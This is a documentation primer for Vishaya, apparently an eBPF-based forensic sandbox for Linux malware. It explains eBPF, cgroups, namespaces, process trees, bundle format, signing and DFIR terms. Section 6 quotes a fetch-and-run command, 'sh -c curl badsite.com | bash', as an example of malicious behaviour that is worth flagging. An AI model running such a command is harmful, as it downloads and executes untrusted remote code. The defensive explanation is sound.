# Concepts

> *Optional. You don't need this to install or use Vishaya — it's a background primer for readers
> new to eBPF, cgroups, or DFIR. Just want to run it? See [getting-started.md](getting-started.md).*

Background primer for readers new to any part of the stack Vishaya sits on. Skim the sections you already know, read the ones you don't.

## 1. What Vishaya is

Vishaya is a **forensic capture tool**: you point it at a suspicious Linux binary, it runs the
binary in a controlled boundary, observes everything it does at the kernel level, and packages
the run into a single portable, signed file. Its closest neighbour is a dynamic-analysis sandbox
(Cuckoo, CAPE, DRAKVUF) — Vishaya is a modern, eBPF-native, single-bundle take on that idea for
Linux, without the heavy VM orchestration. It is **not** an EDR, a SIEM, or a fleet monitor; for
the full "what it is and deliberately isn't," see [vision.md](vision.md).

Mental model: one `.vishaya` is a self-contained *case file* for a single suspect binary — a
portable, signed record of one run that any compatible tool can open.

## 2. eBPF in one page

**eBPF** stands for "extended Berkeley Packet Filter." Despite the name, modern eBPF has almost nothing to do with packet filtering — it's a general-purpose in-kernel virtual machine.

You write a small program in a restricted subset of C, compile it to eBPF bytecode with clang, and hand it to the kernel. The kernel's **verifier** checks that your program is safe: bounded loops, no unbounded memory access, no crashes. If verification passes, the kernel JIT-compiles the bytecode to native code and lets you attach it to specific hook points.

Vishaya attaches eBPF programs to **kernel tracepoints** — stable ABI hooks the kernel exposes for observability. When a process makes a `write()` syscall, the kernel fires the `sys_enter_write` tracepoint, which runs any eBPF program attached to it. That program can inspect syscall arguments, read task metadata, and (importantly) push structured records into a **ring buffer** that userspace reads.

Key eBPF concepts to know:

- **Programs** live in the kernel and run on hook events. Vishaya has one per syscall/tracepoint it cares about.
- **Maps** are typed key-value stores shared between the kernel program and userspace. Vishaya uses several: a ring buffer for events, a hash map for state correlation between syscall enter/exit, an array to hold the target cgroup ID for filtering.
- **CO-RE (Compile Once, Run Everywhere)** uses BTF (BPF Type Format) debug info in the kernel to let the same compiled BPF object work across different kernel versions with different struct layouts. Vishaya's build script dumps BTF from your running kernel into `bpf/vmlinux.h` at build time.
- **The verifier** is strict. It rejects any program that has unbounded loops, reads arbitrary memory, or has undefined behavior. This is why some things in `bpf/vishaya_common.bpf.h` look awkward — they're written for the verifier, not the human reader.

**Why eBPF for forensic capture?** Because it observes at the kernel level with essentially zero data loss (as long as the ring buffer isn't overwhelmed), no code changes to the target, and no ptrace-style slowdown. Compared to `strace` on a target binary, eBPF is dramatically faster and doesn't perturb the target's timing.

## 3. Cgroups v2

**Cgroups (control groups)** are a Linux kernel feature for grouping processes and applying resource limits or observability to the group.

You've probably heard of cgroups in the context of Docker or systemd — that's what they use to isolate container resource usage.

Cgroups come in two flavors:
- **v1** (legacy) — one controller (memory, cpu, io, …) per hierarchy; complex.
- **v2** (unified) — one hierarchy for everything; simpler. All modern systemd-based distros default to this.

For Vishaya's purposes, we don't care about resource limits — we care that **every process has a well-defined cgroup ID** that's accessible from BPF programs. When we launch the target, we put it in a fresh cgroup. Every child it forks automatically inherits the same cgroup. Our BPF probes look at each event's originating task's cgroup ID and drop the event if it doesn't match our target cgroup.

This is the mechanism that makes Vishaya **target-scoped**. Without it, our probes would see events from every process on the host — noisy and useless.

Practical details:

- The cgroup ID is the **inode number** of the cgroup directory in `/sys/fs/cgroup/`. That's how BPF gets it: `bpf_get_current_cgroup_id()`. Userspace gets the same value via `stat().st_ino` on the directory.
- To put a process into a cgroup, write its PID to `<cgroup-path>/cgroup.procs`.
- To remove a cgroup, `rmdir` its directory. Fails with `EBUSY` if any process is still attached.

## 4. Linux namespaces

**Namespaces** are the other half of what people mean by "Linux containers." Each namespace gives a process an isolated view of one kind of kernel resource:

- `mnt` — mounted filesystems
- `pid` — process IDs
- `net` — network interfaces and stacks
- `uts` — hostname
- `ipc` — SysV IPC and POSIX message queues
- `user` — user and group IDs
- `cgroup` — the cgroup hierarchy

`unshare(CLONE_NEW*)` creates a new namespace and moves the calling process into it. `setns()` moves an existing process into an existing namespace.

Vishaya uses only the **mount namespace**. When we launch the target, we `unshare(CLONE_NEWNS)` in the child so any filesystem mounts the target does don't leak back to the host. We deliberately don't use the PID or network namespace for reasons documented in [architecture.md §6](architecture.md).

## 5. The fork / exec model

Linux starts a process in two steps: `fork()` duplicates the caller, then `execve()` replaces the
child's image with the target binary. Vishaya uses this dance with one addition — a
**synchronization pipe** so the parent can attach the child to the target cgroup *before* the child
`execve`s. The child blocks on the pipe right after fork; the parent writes the child's PID to
`<cgroup>/cgroup.procs`, then releases it. So by the time the target runs and its probes fire, it
is already scoped and no host events leak in through a startup race. Full step-by-step:
[flow.md §3](flow.md); code: [target_launch.cpp](../src/isolation/target_launch.cpp).

## 6. Process lineage

When a process (`fork` or `clone` or `vfork`) creates a child, we get an event that names both the parent (via the standard `pid`/`tgid` header fields) and the child (via a `child_pid` field in the event data). When the child `exec`s a new binary, we get an `exec` event carrying the new binary path.

By walking the stream of these events chronologically, we can reconstruct the **process tree** — who spawned whom, what they ran, when they exited. Vishaya does this once at bundle-finalize time in `bundle/process_tree.cpp` and writes the tree to `process_tree.json` in the bundle. The `vishaya tree` subcommand renders it as ASCII art.

Malware analysis leans heavily on process trees: a suspicious binary spawning `sh -c curl badsite.com | bash` is often more damning than any single syscall it made.

## 7. Tar + Zstd bundle format

`.vishaya` is a **tar** archive (bundles files into one stream, preserving names and modes)
compressed with **zstd** (gzip-quality ratios at several times the speed; now standard in the
Linux kernel). The pairing was chosen because it's inspectable with tools every analyst already
has (`zstd -d | tar -tv`), invents no new container, streams in both directions, and compresses
JSON event logs well (~5–10×). The exact entry order inside — `manifest.json` first, so a
streaming reader can check the schema version before decompressing the rest — is defined by
[bundle-spec-v0.1.md §2](bundle-spec-v0.1.md).

## 8. NDJSON

**Newline-Delimited JSON** — one complete JSON object per line, no wrapping array. Vishaya's `events.ndjson` uses this because it's:
- Streamable (parse and emit line by line without loading the whole file)
- Greppable (`grep '"family":"file"' events.ndjson`)
- Diffable (order stable, so line-by-line diff of two captures is meaningful)

The tradeoff is that it's not a valid single JSON document. Tools that expect JSON arrays (some `jq` invocations) need `--slurp` or similar.

## 9. Integrity hashing and signing

`.vishaya` bundles carry SHA-256 hashes of `events.ndjson`, `process_tree.json`, and (when
present) `artifacts.json` in the manifest. Readers recompute those hashes to detect accidental
corruption or tampering.

Bundles are also **cryptographically signed by default** — the manifest is signed with an
Ed25519 key (auto-generated on first run), and the reader verifies the signature at open time.
Because the manifest contains the content hashes, one signature covers the whole bundle. Honest
scope: the key is *self-generated and travels in the bundle*, so a valid signature is strong
**tamper-evidence** (the content matches the key that signed it) plus **pinned-key verification**
(`vishaya verify --verify-key`) — not third-party attestation of *who* signed. Keyless
attestation (Sigstore/Rekor) is the v1.0 milestone. See [bundle-spec-v0.1.md §6](bundle-spec-v0.1.md).

## 10. DFIR terminology

A few terms that come up if you read the docs or the vision:

- **DFIR** — Digital Forensics and Incident Response. The discipline of "something bad happened, figure out what and how bad."
- **IR** — Incident Response.
- **CERT / CSIRT** — Computer Emergency / Security Incident Response Team. Organizational unit that does IR.
- **IOC** — Indicator of Compromise. A specific artifact (file hash, IP address, domain, YARA rule) that says "this thing was touched by known-bad activity."
- **TTP** — Tactics, Techniques, Procedures. Higher-level than IOCs; describes how an attacker operates. MITRE ATT&CK catalogues these.
- **Persistence** — mechanism by which malware ensures it stays installed after reboot (cron entry, systemd unit, `.bashrc` line, etc.). One of the first things forensic analysis looks for.
- **C2 / C&C** — Command and Control. The server malware phones home to for instructions.
- **Detonation** — running suspicious code in a sandbox to see what it does.
- **Sample** — a specific piece of malware being analyzed.

## Where next

- [getting-started.md](getting-started.md) — do it, don't just read about it
- [architecture.md](architecture.md) — how the pieces fit together, at the design-decision level
- [flow.md](flow.md) — the capture and inspect paths as sequence diagrams
